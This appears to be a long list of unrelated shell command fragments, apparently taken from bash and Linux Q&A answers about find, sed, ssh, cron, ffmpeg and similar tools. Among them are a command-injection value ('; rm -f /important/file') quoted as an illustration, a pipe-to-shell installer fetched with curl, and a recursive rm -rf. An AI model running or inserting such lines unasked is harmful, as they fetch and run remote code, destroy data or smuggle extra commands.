/mnt/c/folder/first.sh && /home/myself/miniconda3/bin/python /mnt/c/folder/second.py
/home/myself/miniconda3/bin/python /mnt/c/folder/second.py
. $HOME/.profile;
export abc=123
man bash
Parameter Expansion
Command Substitution
The Linux Documentation Project
 hello
\[ \]
export PS1=…
CMD ./start.sh
apachectl start
apachectl -D FOREGROUND
docker stop
2>&1 1>/dev/null
man bash
1>/dev/null 2>&1
2>&1 1>/dev/null
1>/dev/null 2>&1
2>&1 1>/dev/null
sudo crontab -e
crontab -e
ps -ef
$value -lt 2
egrep states.txt states.txt
egrep s\* states.txt
egrep s2 s5 states.txt
ls -l
sudo -E bash
sudo chown
find ~ -user root -exec ls -ld {} \;
file (2).rar
net use Z: //xx.x.x.xx/abc
ForceCommand /path/to/the_script
-type f
-mtime +1095
-type f
-ctime +1095
-mtime +1095
-atime +1095
find BAR -type f -ctime +1095
-exec rm {} +
"it works"
test1 && test2
false && foo
echo 2
false && echo 1; echo 2
false && foo
ssh example.host some_command
find ./public/wp-content -mindepth 1 ! -regex '^.\/public\/wp-content\/themes\(.*\)' -delete
find ./public/wp-content -mindepth 1 ! -regex '^.\/public\/wp-content\/\(themes\|images\)\(.*\)' -delete
<file1 paste - - - - -
1 !
1 !
/(.*)/ !
column -t -s $'\t'
permission denied error
x=`find vendors -perm 755` 
-perm 755
! -path vendors
find vendors/ …
! -path vendors/
find ./vendors …
! -path ./vendors
-type f
-exec basename -a -- {} +
-exec basename -- {} \;
sort -u
echo ${Myvar:0:1}
/bin/sh -c <script name>
pgrep pgrep_test.sh | grep -v $$
ps -ef | grep pgrep_test.sh
* * * * * user1 /tmp/inferencing/pgrep_test.sh 2>&1 >> /tmp/inferencing/test.log
vim pgrep_test.sh
$( ... )
$(ps -ef)
grep --file=file_of_patterns.txt
$added_modified_file, it will 
rm  *[!0-9][0-9]?*
rm *[!0-9][!0-9]?*
find -maxdepth 1
 OLDEST:
 NEWEST:
cd Folder
( )
for d in ./*/
for d in ./*/
cd "$d"
 OLDEST:…
./ OLDEST:…
 OLDEST:
printf 'DIR:%s\0' "$d"
-type f
-type f
-maxdepth 1
-type f
 OLDEST:
 NEWEST:
 OLDEST:
 NEWEST:
sed -z '1 p'
cd /home/jhonst/data_lake/1m && tar -c --use-compress-program=pigz -f UX.tar *.UX.csv
-f UX_${d}.tar
-f UX.tar
arp -a
nmap -sn -192.168.1.*
match(string, /regex/, output_variable)
nmap -sn 192.168.1.* | gawk 'match($0, /Nmap scan report for (.*)/, a) {print a[1]}
Nmap scan report for (.*) \((([0-9]{1,3}\.?){4})\)
Nmap scan report for (.*) 
Nmap scan report for (.*) \((([0-9]{1,3}\.?){4})\)
du -sh
find / -type d
find: failed to read file names from file system at or below '/': No such file or directory
ls -la /
find $(mount | cut -d ' ' -f 3 | grep -x '.\{2\}' | tr '\n' ' ') -type d 
C: on /c type ntfs (binary,noacl,posix=0,user,noumount,auto)
cut -d ' ' -f 3
grep -x '.\{2\}'
 tr '\n' ' '
find /c /d /e -type d
chmod +x record.sh
sudo snap install alacritty --classic
cp -r /some/path /another/path2
cp -r /some/path/ /another/path2
cp -r /some/path/ /another/path2/
cp -r /some/path /another/path2/
cp -r
cp -a
cp -r abc def
cp -r abc def
Server 'Test EF'
option port '1234'
option port '9876'
Server 'Test EF'
Server 'Test EF'
Server 'Test EF'
option port '1234'
option port '9876'
ðf /home/circleci/anaconda.sh
01 - Artist - Musique (explicit).flac
Plugin audit
-type f
file exists
-mindepth 2
-path './*/*'
-exec ln -s -t ./ {} +
-exec … {} +
-exec ln -s {} ./ +
sh -c 'some shell code' sh
file exists
ln -v
-exec … {} +
-exec ln -s {} ./ \; -print
-exec … \;
301 Moved Permanently
"/bin/sh: 1: Syntax error: redirection unexpected"
alias dep="dep -fdeploy/deploy.php"
cp -Pp /root/dir1/libfoo.so* /root/dir2/
vim -c map > out.txt
vim -c "map|q" > out.txt
sudo mkdir /opt/systemd/
sudo mkdir /opt/systemd/
sudo nano /opt/systemd/vboxhostonly
cd /opt/systemd/
sudo chmod a+x vboxhostonly
sudo nano /etc/systemd/system/vboxhostonlynic.service
[[ ]]
echo "not valid"
[[ ]]
IFS= read -r line
ps -p 3454 -o command
-D -a
ps -p 3454 -o comm
ps -p 3454 -o command
ps -p 3454
-o command
-o command
-D -a
-o comm
-o comm
-o command
pi@myserver:~ $ pi@myserver:~ $
ls -lh
No such file or directory
0 hardlink
ls -lh
file <filename>
<filename>: writable, executable, regular file, no read permission
ls -lh
cat <filename>
file <filename>
find / -xtype l
effective UID
1200  1000  0
sudo pip install kaggle-cli
pip: order not found
ps ho lstart 1
| grep Status | sed 's/.*"Status": "//' | sed 's/",//'
jq -r .DBClusterSnapshots[0].Status
jshon -e DBClusterSnapshots -e 0 -e Status -u
python -c "import sys, json; data = json.load(sys.stdin); print(data['DBClusterSnapshots'][0]['Status'])"
perl -MJSON -E '$/=undef; $data=decode_json(<>); say $data->{DBClusterSnapshots}->[0]->{Status};'
--output text
systemctl status cronie
sudo apt-get install i3
settings="$(stty -g)"
stty intr ' '
trap 'stty "$settings"' EXIT
stty $settings
stty "$settings"
stty -g
stty intr ^C
printf '\r%s' …
git init lerna-repo && cd lerna-repo 
repo="larna-repo" && git init $repo && cd $repo
echo $repo
echo "Hello World!" | grep "Hello"
 ~/.oh-my-zsh/custom/config.zsh
git branch
systemctl start my-program.service
3: dotnet: not found
flatpak search Sdk | grep -i jdk
flatpak install org.freedesktop.Sdk.Extension.openjdk17
flatpak run --command=sh com.visualstudio.code
ls /usr/lib/sdk
| grep -- "-> /"
-crf 17
ffmpeg -y -i pathsource.mkv -vf "subtitles=pathsource.mkv:force_style='Fontsize=72,Fontname=Arial Bold,PrimaryColour=&HFFFFFF&'" -acodec copy -vcodec libx264 -crf 17 -pix_fmt yuv444p destination.mp4
find . -type d -name '*bar*' -not -name '.bar*' -exec 'ls' '{}' ';'
cd ..
cd folderName
mkdir newFolder
echo "Delete finished!"
rm -r TestFolder/*
man rm
rm -rf /path/to/dir/*
telnet hosntname 22
-print0 | while read ...
find ... -exec
find ... -exec bash -c ...
ls -l /bin/sh
echo $PATH
<< "EOF"
java -jar jmx.jar
asynchronous_command &
ssh -t
ssh -t
mktemp -d
trap "sleep 1; kill \"$relay\"" EXIT
java -jar jmx.jar >&2
java …
for … echo DONE
mktemp -d
ps aux
systemctl is-active MyApp
java -jar myapp.jar & echo $! > java.pid
pgrep java
pgrep -f MyApp.jar
pgrep -a java
ps axo pid,cmd
ps … | grep …
read line
#!/usr/bin/env bash
chmod a+x mytest
 | grep -qvE '^>'
| grep '^>' |
| grep '^>' | ifne 'false'
rsync ... | pee cat "grep '^>' | ifne 'false'"
bash test.sh
./test.sh > /dev/null 2>&1
chmod +x ./test.sh
docker build . -t test && docker run -it test
warning: ... 
New Folder
cd \"\${HOME}\"
cd ~/Desktop
git bash
cd tes
cd test_folder
make MyTest && 
less mount
mount | less
less mount
mount | less
which mount
chsh -s /usr/local/bin/bash
bash --version
which bash
sudo chpass -s /usr/local/bin/bash sjc
bash --version
which bash
>bash --version
>which bash
bash --version
which bash
0.0.0.0 mask 0.0.0.0
via 0.0.0.0
man ip-route
sudo update-alternatives --config x-terminal-emulator
$ conda activate myenv
sudo -s
play alarm.flac fade 7200 repeat 999
repeat -
fade t 7200
echo "export EDITOR=nano" >> ~/.bashrc
slack https://<company>.slack.com/archives/<...>
firefox --new-window https://<company>.slack.com/archives/<...> & sleep 5 ; kill $!
jq -c '.[] | objects' mydata.json | jq -c --arg a "$(uuidgen)" '.id = $a'
curl -X POST http://localhost:8080
-d @-
-t "-" -k2
| sort -n -k3.5
| sed -E 's/-0(.)$/-\1/'
ssh servername2
screen -ls
ssh ssh.mylaboratory.fr
ssh lab
ssh -J lab server2
ssh -J
ssh server2
sshfs server2:[...]
play ~/Music/audio0.flac repeat -
play ~/Music/${random_audio_file} repeat -
Remove-Item \\HQDEVAPP004\C$\LoneStar\ProcessorHandlers\Test\*.* -Recurse -Force
sudo -u userB ./script.sh
sudo -u userB /home/userA/script.sh
grep -r
mv file1.txt file2.txt
cp !("$(ls...)") ~/...
cp -t <target>
find ... -print0
xargs -0
./ocp /home/patrick/sitemap.xml
"$k"_Id_avg="$(grep -i "$k"_Id_avg file.txt)"
echo "$k"_Id_avg
01. Some title (Some album)
01. Some title ()
01. Some title
command &
pacman -S sh
if [ "$1" = "clear" ] || [ "$1" = "c" ]
[ … ]
if … then …
if true; then …
if sleep 5; then …
if [ … ]; then …
[ … ]
type -a [
type -a [[
[ … ]
[ … ]
[ "$1" = "clear" || "$1" = "c" ]
[ "$1" = "clear"
"$1" = "c" ]
[ "$1" = "clear"
[ … || … ]
[[ "$1" = "clear" || "$1" = "c" ]]
[ "$1" = "clear" || "$1" = "c" ]
[ A = B -a C = D ]
grep -b
grep -o
source ~/.bashrc
git fetch --all
Could not fetch <remote>
git fetch --all
| grep
pwd, cd, ls, cp, mv
sed 's/$/\\n'
tr -d '\n'
'git '
git 
export PYTHON="$(which python)"
export PYTHON="$(which python3)"
npm config set python /usr/bin/python3.9
npm config set python "/usr/bin/python3.9"
export PYTHONPATH="$(which python)"
RUN apk add --update --no-cache python3 && ln -sf python3 /usr/bin/python
ip link set eth0 down
ip link set eth0 up
aux |grep "somename"
ps aux |grep "somename"
OUTPUT=$(ps aux |grep "somename")
' 10.10.40.29 myhost'
set -x
bash -c
sudo su
/bin/cat -v
data = $0; sub($1 " ", "", data)
mkbootimg "${arr[@]}"
printf …
...  >z ; . z ; rm z
source <(...)
source "$f";
source <(...)
. 
source 
man curl
Invoke Command -ComputerName $computername -Scriptblock{...}.
"Invoke-Command : Cannot validate argument on parameter 'ComputerName'. The argument is null or empty."
crontab -e
bash /home/e.n.ermakov@university.local/Documents/VS_Code/Bash/bot.sh
fswatch -o "$dir" | xargs -n1 -I{} osascript ./reloadActiveChromeTab.scpt
fswatch -o "$dir" | xargs -n1 limit "1 second"  | xargs -n1 -I{} osascript ./reloadActiveChromeTab.scpt
alias c='clear'
source .NewAliassh
echo $VERSION
echo $VERSION
curl "${args[@]}"
exit 0
ENTER to begin installation:
/usr/bin/expect -d
\r\nENTER to begin installation: 
\r\n\u001b[1mENTER\u001b[0m to begin installation: 
\u001b[1m \u001b[0m
to begin installation: 
nano testfile.txt
man grep
egrep -rn "244959560909|327149205|2022-03-18" * 
egrep -rn "244959560909.*327149205.*2022-03-18" *
grep -r "MSP" .
mv /home/user/Downloads/foo.bar /home/user/Documents/
mv /home/user/Downloads/foo.bar (whatever operator)/../Documents/
echo 
cd /home/user/Downloads/../Documents/
cd /home/user/Documents/
mv foo.bar ../Documents/
cd /home/user/Downloads/
for file in *
find /path/to/updated -name $file
-exec cp $file {} \;
sudo', and add new files/folders to the 
declare [-aAfFgiIlnrtux] [-p] [name[=value] …]
export PATH=$PATH:/Applications/TexturePacker.app/Contents/MacOS
System Preferences > Users & Groups > Login Options > Network Account Server: Join... > Open Directory Utility... > Directory Editor > [yourAccountUserNameHere] > UserShell
sed -ein …
sed -e in …
-i something
-i -n
sed -e -i …
sed -nwhatever
sed -n -whatever
-a -b -c
sed -ewhatever
sed -e whatever
-i whatever
-i -whatever
sed -i
man sed
man ls
man du
ls -hls
du -hms
[#FFFFFF]this is white text
0x00 0xA0 0xFF
[#FFFFFF]this is white text
uname -m
uname -m
uname --machine
'ad port ' 12345
apt show complete
apt show complete
/usr/bin/bash;61f1808a (deleted)
$ man bash
-perm -740
chmod g-wx,o-rwx …
chmod -R
ssh localhost ls
git clone https://github.com/IanPNewson/Proxy
cd Proxy/ProxyServer
dotnet run {open port you have permission to}
dotnet run 4843
sudo howdy config
sudo howdy config|cat
sudo howdy config|code
man sudo
sudo -E
ps axf
ps axf
curl -s whatever 2>&1|tee output.txt|grep ERROR
command [arg...]
set -o pipefail
man 1 curl
FAILON_STATUS=120 failon …
tee -p
grep -q
grep -- "$pattern" >/dev/null
curl … | tee /temporary/file
! grep -q ERROR /temporary/file
"$@" >&3 | { grep -q …
"$@" | tee … | { grep -q …
tee -p /proc/self/fd/3
failon foo program
find . -mindepth 8 -regex ".*/.*/caches/.*/.*/.*"
$ sftp remote_username@server_ip_or_hostname
get filename.txt
get -r remote_directory
do_backup > log.txt
do_backup > /dev/null
foo <<< bar
echo bar | foo
(cmd &)
kill "$animPID"
echo foo
ffmpeg -i $(youtube-dl -g -f 22 "https://youtu.be/n-ctMKGBt_E") -ss 38347 -to 38838 -c copy 2022-04-04_PPJT45_720p.mp4
$ gdate --date='TZ="America/New_York" 1am' +"%a %F %H:%M %Z"
set -x
Generic method: ssh user@server "echo \"cat ~/.ssh/id_rsa.pub\" >> .ssh/authorized_keys"
"one or more blanck space"
cat heading.txt| tr -s '[:blank:]' ',' | tr -s '|' ',' | tr -s '(' ',' | tr -s ')' ',' > exptected_output.txt
cat heading.txt| tr -s '[:blank:]|()' ',' > exptected_output.txt
nc -l 4444 1>&3
echo test 1>&3
echo $domain_name does not resolve from $def_ip
eval $domain_name ...
$( ... )
( ... )
[ ... ]
[[ ... ]]
[[ ... ]]
tail -F /tmp/foo.txt |& grep -E "error"
trap worked
sleep 10
ls: cannot access 'gvfs': permission denied
Given area is not inside desktop.
Mon  9 May 18:24:36 BST 2022
man 1 tar
Mon 9 May 18:24:36 BST 2022
Mon 9 May 18
man 1 date
ssh localhost 'mycommand'
devloper group: devs:r-x to /var/log/httpd
git clone
permission denied
find ... -exec ...
$(basename {})
basename {}
find … -print0 | xargs -0 …
find … -exec …
sh -c 'some shell code' sh
printf ("%2X\n", 'A');
printf "%2X\n" 'A'
bash: printf: A: invalid number
printf "%X\n" \"A\"
sed '1!{/stringX/d}'
3.4 + 54.2 + 4.5 + .....
ls /mnt/g gives
WHERE EnodeB_Fin    Date_Time_Fin >= '2022-03-15 00:00:00'
WHERE EnodeB_Fin    Date_Time_Fin >=
bindkey '^[[3;3~' kill-word 
chsh -s /bin/bash
./md5.sh (md5_hash)
apt install python
wget https://youtube-dl.org/downloads/latest/youtube-dl
chmod 777 youtube-dl
while read in; do ./youtube-dl "$in"; done < vidfilelist 
youtube-dl https://www.youtube.com/watch?v=iXFvkJLqPqo
youtube-dl https://www.youtube.com/watch?v=-QwtKBC6iQY
bash "insertname".sh
unalias bash
/foo; /bar
eval "_specific ${BASH_COMMAND#/}"
eval "_specific $BASH_COMMAND"
/ whatever …
<input /foo >output
/foo | wc -c
/foo || whatever
man 8 findmnt
findmnt --help
man 1 stat
src1='/home/u3/Music/x' ; clear ; echo "   one line PTTYPE status (Partition Type): " ; tput sgr0 ; device="$(findmnt -nvfo SOURCE -T "$src1")" ; [ "$device" ] && lsblk -o PTTYPE "$device" | paste -sd ' ' | tr '\n' ' ' ; tput setaf  12 ; echo "$src1" ; 
PTTYPE dos /home/u3/Music/x
src1='/home/u3/Music/x' ; clear ; echo "   one line FSTYPE status (File System): " ; tput sgr0 ; device="$(findmnt -nvfo SOURCE -T "$src1")" ; [ "$device" ] && lsblk -o FSTYPE "$device" | paste -sd ' ' | tr '\n' ' ' ; tput setaf  12 ; echo "$src1" ; 
FSTYPE ext4 /home/u3/Music/x
command_name argument --option LINE1
command_name argument --option LINE2
cat FILE.txt | xargs -L 1 echo --option | xargs -L 50 command_name argument
FOR /f
xxhsum --version
| head
| awk
md5sum --version 
md5sum --version | head -n1
md5sum --version | head -n 1
md5sum --version | awk 'NR==1'
xxhsum --version
xxhsum --version | head -n1
xxhsum --version | head -n 1
xxhsum --version | awk 'NR==1'
xxhsum --version
sudo dpkg-reconfigure dash
lsblk --noheadings --raw | awk '{print substr($0,0,4)}' | uniq -c | grep 1 | awk '{print "/dev/"$2}' ;
lsblk --noheadings --raw -o NAME,MOUNTPOINT | awk '$1~/[[:digit:]]/ && $2 == ""' ;
lsblk --noheadings --raw | awk '$1~/s.*[[:digit:]]/ && $7==""' ;
lsblk  --noheadings --raw | awk '{print substr($0,0,4)}' | uniq -c | grep 1 | awk '{print "/dev/"$2}' | grep -E "(/dev/sd.)[[:digit:]]" | xargs -I{} -n1 udisksctl mount -b {} ;
Mounted /dev/sdd1 at /media/u3/USBstick
/dev/sdd1 FAT (32-bit version)
man bash
Programmable Completion
foobar 
foo 
<?php phpinfo();
> /dev/null 2>&1
iscsiadm discovery...
> /dev/null 2>&1
[some_num.some_dec] LOG_MESSAGE
dmesg -n warning
iscsiadm -m discovery...
iscsiadm -m session
export PROMPT_COMMAND='history -a > .....
brew uninstall youtube-dl
sudo pip uninstall youtube-dl
sudo pip3 uninstall youtube-dl
sudo apt-get remove youtube-dl
youtube-dl --version
whereis youtube-dl
pip list -v
pip install --upgrade youtube-dl
pip install youtube-dl
sudo find / -name youtube-dl
sudo find / -type f -name "youtube*"
script --version
script /home/x/Desktop/clamlog2.cat ; # Log file start.
script --version ;                    # 2.34 version number, for clarity.
bash /media/x/usb_stick/clamscan.sh ; # virus scan script.
ls ;                                  # example of other commands to Log.
exit ;                                # Log file end.
cat /home/x/Desktop/clamlog2.cat ;    # review Log file in colour.
Script started, file is /home/x/Desktop/clamlog2.cat
script mylog
cat mylog
script mylog
script /home/x/Desktop/clamlog2.cat
cat …
script …
script …
cat …
cat …
script --command
man 1 script
-c, --command command
ls; date
script …
ssh user@server
script -c
bash -c code
ssh user@server code
script /home/x/Desktop/clamlog2.cat -c '
    clear                                 # reduce scroll-back text / screens.
    bash /media/x/usb_stick/clamscan.sh   # virus scan script.
    echo "Ctrl-Shift-UParrow              # keyboard shortcut scroll-back reminder."
cat /home/x/Desktop/clamlog2.cat
awk 1
awk 0
seen[$1 SUBSEP $2]
man sort
[process exited with code 1 (0x00000001)]
Computer\HKEY_CURRENT_USER\Software\Microsoft\Command Processor
pip install matlab
matlab --version
bash: matlab: command not found
sudo ./install
local_computer> ssh remote_server './synchronize-folder.sh'
export REQUIREMENTS_FILE=/src/requirements/dev.txt
du -sh
71M    /home/reguser
git shortlog
$(ls -lh)"
$(/usr/bin git shortlog -3)
git shortlog -3 >> /tmp/git-log
cd /myrepo.git;git shortlog -3 >> /tmp/cron-output 2>&1
sudo: java: command not found
sudo java
sudo -i
sudo ./schema.pg.sh
ls -l sql/
ls -ld /sql
sudo chmod +x /sql
sudo chmod +x schema.pg.sh
mount | grep $(df -P /sql | awk 'NR==2{print $1}') | awk '$0=$5'
[[ -v var ]]
echo "\${var} not defined"
not defined
[[ -v var ]]
echo "\${var} is defined"
is defined
mkdir -p Website/{static/{cs,js},templates/{"$var"}}
cd /
cd ..
cd -
cd ..
cd -
cd /usr/local
cd ./bin
cd ..
cd ../../etc
man cut
make install
swapon /swapfile
cp -r jdk1.8.0_331 /usr/java
ssh root@app-1 < java_install.sh
[Mm]etrics? 
Metric whatever
Metrics results:
 # This should be captured
grep -E
grep -E
grep -E
trap EXIT
trap ... EXIT
trap ... RETURN
dpkg-query -Wf '${Installed-Size}\t${Package}\n' | sort -n | tail -n 10
systemctl --user
systemd --user
/lib/systemd/systemd --user
su user
systemctl --user
systemctl --user
echo $?
echo 85;
echo $?
head -n 1
Volume 1
Volume 2
Volume 3
sudo apt-get update
ls /var/
. foo.sh
. foo
assoc .sh
ftype sh_auto_file
ftype bash.File=c:\somepath\bash.exe "%1" %*
assoc .sh=bash.File
mv ./script1.sh ./script1
chmod 777 ./script1
export PATH="$HOME/my-scripts:$PATH"
read xyz
man echo
 find ./ -type l -print0 | xargs -0 ls -plah
find . -type l
tar --files-from=-
cd … && foo …
tar -x
tar -c
tar -x
grep -n ' \.*' test.txt
grep -n '\.*' test.txt
 
' \.*'
echo "{ORANGE}Downloading APK."
echo "{GREEN}Download finished.
sudo rm -rfv foldername
convert *.bmp something.png
... --abbrev-commit --date=relative spc
shift 2
shift 2
command git ...
Jan 1 01:01:01 2001
read only
zsh {}
zsh -c
LOCAL | BASE | REMOTE
LOCAL | LOCAL | file
\( \)
$(date +%d%H%M)
bash -c 'nohup ffmpeg -nostdin -stimeout 10000000 -rtsp_transport udp -i "rtsp://192.168.0.11:6554/Streaming/channels/101" -reconnect 1 -reconnect_at_eof 1 -reconnect_streamed 1 -c:v libx264 -f ssegment -strftime 0 -segment_time 180 -segment_format_options movflags=+faststart -reset_timestamps 0 -increment_tc 1 -avoid_negative_ts 1 -c copy -flags +global_header /var/www/camera_streams/camera_east_driveway/"$(date +%d%H%M)"_%3d.mp4 > /dev/null 2>/dev/null & '
"$(date +%d%H%M)"_%3d.mp4)
-strftime 0
bind -P
sed 's/search/replace/'
sed 's%search%replace%'
find .
grep -v
! -path .
-printf …
-printf …
-printf …
-printf …
-printf …
-printf …
-printf …
-printf '%p\0'
-printf '%p\n'
-printf "%T@ %p\n"
-iname '*.mp3' -type f
%T@ 
-iname '*.mp3'
-type f
-iname '*.mp3'
export LC_ALL=C
rsync -r --delete
command1 | tee >(command2 >&3- ) >(command3 >&4- ) >/dev/null | join -j1 /dev/fd/3 /dev/fd/4
left | right
echo "${COPROC[1]}"
exec 60>&-
exec "${COPROC[1]}">&-
exec 60 >&-
exec {COPROC[1]}>&-
bash --affinity=1 -c ruby.exe
interface e0/0
{ sed … ; } <input.txt >output.txt
sed …
sort -z
git add -A
awk '{gsub(/^[[:punct:]]+|[[:punct:]]+$/, "")} 1' myfile.txt
/usr/bin/ls: No such file or directory
Permission denied (publickey,gssapi-keyex,gssapi-with-mic,password).
export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin
source ~/.bash_profile'
'.archives | first | .end'
> ${repo}
> $repo
> $foo
pip install
python -m pip install
pip install
python -m pip install
ignoreip = ip
sed '10d' /etc/fail2ban/jail_test.conf
cat $WHITELIST_IP | xargs -n1 echo "ignoreip =" >> /etc/fail2ban/jail_test.conf
banip 0.0.0.0
unbanip 0.0.0.0
sudo tee …
sudo tee some_file >/dev/null
chmod u+sx
chmod u+sx
sudo <command>
U1> su U2
U2> sudo -u U1 <command>
sudo <command>
sudo -u U1 echo $VAR
-u U11
U1> su U2
U2> sudo <command>
sudo -u someotheruser
sudo -u U1
tput setaf
tput sgr0
curl -fsSL https://deno.land/x/install/install.sh | sh
max connections = 1
 @ERROR: max connections (1) reached -- try again later
max connection = 1
max connections = 1
max connections = 1
per module
ERROR: max connections (1) reached -- try again later
if "./Settings/$modloader.ini";
test -e
test -e
if … fi
cp -n
renice -n 19 -p "$pid" && cpulimit -p "$pid" -l 20
renice -n 19 -p $pid && cpulimit -p $pid -l 20
pgrep "$process_name"
echo "firefox" | at now
man 1 at
echo "firefox" | at now
await session.async_send_text('export PROMPT_COMMAND='echo -ne "\033]0;TAB TITLE\007"'\n')
tabset --title Test
getent passwd $USER
printenv SHELL
shell bash
altscreen off
' /'
' /'
' /'
git branch -a | grep -v HEAD
git branch -a | grep -v HEAD | sed "s/ \//%/ | "cut -d'%' -f3 | grep -v master
ffmpeg -i "funnyvideo.mkv" -ss 0 -f segment -segment_time 15 -vcodec copy -reset_timestamps 1 -map 0:0 -an funndyvideo/funnyvideo%2d.mkv
for myfile in $(find ./funnyvideo); do echo file "'$myfile'" >> filelist.txt; done
shuf filelist.txt >> filelist_shuffled.txt
ffmpeg -f concat -safe 0 -i filelist_shuffled.txt -c copy long_clip_shuffled.mkv
readlink A
readlink -f A
bash version
GNU bash, version 5.1.16(1)-release (aarch64-apple-darwin21.1.0)
echo $BASH_VERSION
alias xxx="/path/to/script"
export $PATH=~/gitClones/myGit/Bug-Bounty-Enumation-w-ZSH/:$PATH
set -e
read from_find
find … | xargs rmdir -p
find … -print0 | xargs -0 …
find … -exec …
mongo --quiet $host:$port/$db --eval 'db.getCollectionNames()'
nohup bash /home/opc/TEST.sh >/dev/null 2>&1 $
ps -ef | grep TEST.sh
nohup bash …
nohup bash …
nohup … &
nohup …
ps -ef
nohup bash …
exec something
ps -ef
exec nohup bash …
exec … &
exec … &
>/dev/null 2>&1
>/dev/null 2>&1
>/dev/null 2>&1
>/dev/null 2>&1
>/dev/null 2>&1
bash /path/to/the_script
chmod +x /path/to/the_script
/bin/bash /path/to/the_script
bash /path/to/the_script
bash /path/to/the_script
cd "$(dirname "$0")"
-stream_loop -1
find -name *.pdf -exec dirname {} ';' > temp && sed 's/\.\///g' temp| sed 's![^/]$!&/!'> remove.txt
ls -d */>current.txt
comm -23 <(sort current.txt) <(sort remove.txt)|sed 's/^/"/g' | sed 's/$/"/g' | xargs rm -r
&& rm current.txt remove.txt
 ls> current.txt
-exec rm -r {} +
rm -r
! -name .
-mindepth 1
! [ -e "$1" ]
rm -r
-exec [ -r {} ] \; -o ! -prune
sh -c 'some shell code' sh
-maxdepth 1
laszip .*laz
sudo adduser <user> sudo
sudo bash
ls -sh
-h, --human-readable
eval '$GETGLOBALPARAMETERS $jobName $JOBENV'
-o time
-o name
-o time
wegt www.google.com
windows ip
Allow LAN
export https_proxy="http://172.24.80.1:7890"
while ! ps --pid $CPY_PID ; do ... ; done
man bash
man ps
$ dd if=/from/file bs=100K of=/to/file progress=status
ls -a | grep -v '^\.'
grep -v '^\.'
ls -AR
man ls
read -q
"/home/tmp/spigot/spigotJars/install/jdk-8/bin/java" -jar BuildTools.jar --rev 1.8.8
--format FORMAT
man 1 pv
man 1 pv
main(int argv, *char[] argc)
sudo su - user
sudo su - user -c /full/path/to/direct
command -v
sudo su - user
usr@srcHost:~$ ssh -i ~/id_rsa -o ProxyCommand="ssh -i ~/id_rsa -W %h:%p usr@jumpHost" usr@targetHostX hostname
set -x
ProxyCommand=ssh -i ~/id_rsa -W %h:%p usr@jumpHost
set -x
/bin/bash -c
set -o noglob
eval "ssh $param …"
ssh $param …
/bin/bash -c
; rm -f /important/file;
rm -f /important/file
/bin/bash -c
printf '<%s>\n'
>(zero or more spaces or tabs)(newline)<
echo "$1 - $2 - $3"
sh -c "echo $1 - $2 - $3"
sh -c "echo $1 - $2 - $3"
xargs -Iline sh -c "sh dummy.sh line"
; rm -f /important/file
sh -c 'some shell code' sh
echo "$1 - $2 - $3"
bind '"\C-x\C-a":"d1/d2/d3"'
tmux bind-key -T prefix a send-keys -l 'd1/d2/d3'
bind-key -T prefix a send-keys -l 'd1/d2/d3'
tmux source ~/.tmux.conf
echo $PATH
echo ...
node -e "..."
-bash: /usr/bin/(program): Input/output error
[[ ]]
find "$base/${subject}/${session}" -mindepth 1 -maxdepth 1 -type d -name "na*" -exec rm -rf {} \;
find "$base" -type d -name "na*" -exec rm -rf {} \;
[ -d …/na* ]
[[ -d …/na* ]]
rm -rf "$base/${subject}/${session}/"na*
Argument list too long
echo rm
shopt -s nullglob
for d in; do …
removing na folder from all folders
( | )
( | )
ls /etc | grep nginx
( | )
shar -M -D -Q Scripts/ > myarchive.sh
sh myarchive.sh
shar -M -D -Q Scripts/ | head -n -1 > myarchive.sh && echo "Scripts/main.sh" >> myarchive.sh
head -n -1
exit 0
grep -v "exit 0"
./test MODIFY
rrename(){ find . -type f -name $1 -execdir mv {} $2 ';' }
rrename '*.md' renamed.md
rrename *.md renamed.md
rrename(){ find . -type f -name "'$1'" -execdir mv {} $2 ';' }
echo -e 20{18..22}"\n"{01..12}"\n"31"\n"com"\n"res1.txt | ./zx.sh
[ -h the_path ]
namei -l
echo ${part} ok
cat file.bin | crop 5 3
cat file.bin | dd bs=1 skip=5 count=3
bash: mingw-get.exe: command not found. 
MinGW Installation Manager
pacman -Syu
pacman -S --needed
pacman -Ss gdb
!!:p >> mycommands.txt
set -e
VMSTATUS=$(qm status $VMID)
set -e
/bin/bash /path/control.sh restart
ExecStart=/bin/bash /path/control.sh restart
journalctl -xe
echo Start command
export JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64/bin/java
mvn compile jib:build
VBoxManage snapshot VminServer delete "TEST - Daily Snapshot" && VBoxManage snapshot VminServer take "TEST - Daily Snapshot"
grep "VboxManage" /var/log/syslog
foo | bar
read -p 'input data: ' TEST
read -p
xz (XZ Utils) 5.2.2
tar (GNU tar) 1.34
xz (XZ Utils) 5.2.4
tar (GNU tar) 1.30
apt-get install
bash myscript.sh --fun1 --name xyz
yourscript.sh --matchid 1
The system cannot find the specified file.
case $1
case $1
case $1
[ $# -gt 0 ]
echo $line | cut -d, -f2
1 orange
orange -> 2
while read
magic 4d5a
uname -r
su - $USER
$(which powershell.exe)
test.Rmd test.txt
test.Rmd test.txt
Hello world
lo wo
rsync -rltD --delete --update --itemize-changes /data/Program\ Files\ \(x86\)/ michele-backup@192.168.1.26:/backup-michele/Program\ Files\ \(x86\)/
jq -r ".[] | select(.Name==\"bbb?take=300") | .ReferenceId" < list.json
select(.Name | contains("bbb"))
--decode --input
echo $DISPLAY
echo $XAUTHORITY
chmod u+x ~/kiosk.sh
sudo systemctl startkiosk.service
sudo systemctl status kiosk.service
alias ls="ls -lo --color=always | awk '{if (NR != 1) {print \$8,\$5,\$6,\$7}}' | column -t"
ls -a
mode: flat
"mode": "flat",
"mode": "patched"
"mode": "compatible"
mode: patched
sudo apt-get install fonts-powerline fonts-hack powerline
pip install powerline-shell
git clone https://github.com/ryanoasis/nerd-fonts; cd nerd-fonts; rm -rf .git; install.sh; # install.sh installs the nerd-fonts
bash -c pwd
MZ* .exe
bash /tmp/script1.sh
bash /tmp/script1.sh
-o ConnectTimeout=seconds
I am speaking from remote machine: <remote_machine_C_ip>
cp: -r not specified; omitting directory
find -type f -maxdepth... -exec cp...
cpio -p
find src/ [...] | cpio -p dst/
man 1 unzip
-exec unzip {} +
-exec unzip {} \;
-exec unzip {} +
-type f
-name "*.zip"
find -name "*.zip" -exec unzip {} +
unzip ./bar.zip ./foo.zip
find -name "*.zip" -exec unzip {} \;
find -name abc.zip -exec . . .
pg .gitconfig
eval $(ssh-agent)
ssh-agent bash
ssh-agent tmux
mkvextract subtitles
set fname=in1
set fname=%1
source ~/.bashrc
